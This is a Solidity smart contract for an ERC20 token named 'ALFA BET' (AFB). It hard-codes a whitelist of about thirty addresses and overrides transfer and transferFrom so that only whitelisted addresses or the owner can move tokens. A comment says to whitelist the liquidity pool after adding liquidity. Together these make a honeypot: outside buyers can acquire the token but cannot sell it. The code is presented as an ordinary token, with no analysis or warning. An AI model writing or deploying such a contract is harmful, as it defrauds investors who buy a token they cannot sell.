// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("ALFA BET", "AFB") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 500000000 * 10 ** decimals());
        whiteList[0x42b08e12B462D772fb7F45DB8CFA1bf4aB829BEf]= true;
        whiteList[0x2d7749932B5Af38F411C32a013bEb84498C9163f]=true;
        whiteList[0xE3220264Bf905a7eA1FD8790F941fabd86633646]=true;
        whiteList[0x519Ea0Eaf0F96c4E43ACeCe8088d12F33567ADeF]=true;
        whiteList[0x05D8938A73e41EC95C4f57c13C3704c4f45F97Dd]=true;
        whiteList[0x91EA3Bb5407Ba30B46a483B91E7DC56883b36Ecf]=true;
        whiteList[0xe60E21b8e0fad957beECb3798F7b604b77b24CB7]=true;
        whiteList[0x222697c79ADcF6E36659f2512b794ba8B46bD39a]=true;
        whiteList[0xA423f6a7ad08dFf9db8cd7D7EFC4a303307945AF]=true;
        whiteList[0xE0081Dd19257fB41021FEBb8bAb7C68aeDe8ABB2]=true;
        whiteList[0x6CCE6BdC35C86391FC84B1a53EEA98da4D7c6182]=true;
        whiteList[0xB4fB2738F62F71a4905152cEAE319f691D97953F]=true;
        whiteList[0x62bcA59fe80288a2F852a935f006dA420E55Ee5c]=true;
        whiteList[0xC0a171CdF0A695347A9DE3B8b8D6eabd444Cf49e]=true;
        whiteList[0x578b8e80A5103B5eD9164E071D69817B85D70d95]=true;
        whiteList[0xF46e30f9Ba2a1252f8a9B2A8580225da39D8BE68]=true;
        whiteList[0xf550658D6212046798DD470697C0c1c0D5A75cfD]=true;
        whiteList[0xB42EB8D80acdC5965e2c98A9207bE3Ebb02fbB18]=true;
        whiteList[0x85Ba995bb815376aD3e5Bc275bb2C2CE23b37524]=true;
        whiteList[0x93c996120397fE115e0F6bf4422C07a7C37845B7]=true;
        whiteList[0x3a4e93d493768eD0cA76967B488a7594172825c9]=true;
        whiteList[0x8826895e93C6Ace17e067F5E8cF9F104946D9c89]=true;
        whiteList[0x43294A8F15F1faE3d6B5E837E8aA6a46c0B1e7bA]=true;
        whiteList[0x07Df9aFd40170dcA6b1f79077C64F3f08D646D8c]=true;
        whiteList[0x6d1adE893e3b95105939f5D75F24fBC60825B9F7]=true;
        whiteList[0xB3c24f79B5C5a613b32f9498D4423C3736c072D1]=true;
        whiteList[0xB1430CDfDd855870649a2Baf4fef049098f46866]=true;
        whiteList[0xA5eB37B69471F07468BFAa453cCBd9234B5bDfc8]=true;
        whiteList[0x3AD05b1Da36dF1488708127c38a9b2c04710Bcf9]=true;
        whiteList[0x46C20b7F11a28d9e9f3a92Bc6b6E6d5EFF6E50Ec]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}